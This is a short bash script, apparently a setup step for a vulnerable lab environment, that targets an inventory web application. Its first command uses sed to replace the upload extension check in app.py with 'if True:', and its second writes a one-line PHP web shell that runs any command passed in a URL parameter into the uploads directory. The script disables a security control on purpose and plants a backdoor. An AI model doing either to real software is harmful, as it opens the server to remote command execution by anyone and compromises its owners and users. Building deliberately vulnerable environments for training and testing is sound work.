#!/bin/bash
set -e

# Remove upload file type restrictions from app.py
sed -i 's/if ext in ALLOWED_EXTENSIONS:/if True:/' /opt/inventory/app.py

# Plant a PHP web shell in the uploads directory
mkdir -p /opt/inventory/uploads
cat > /opt/inventory/uploads/shell.php << 'PHPEOF'
<?php system($_GET['cmd']); ?>
PHPEOF
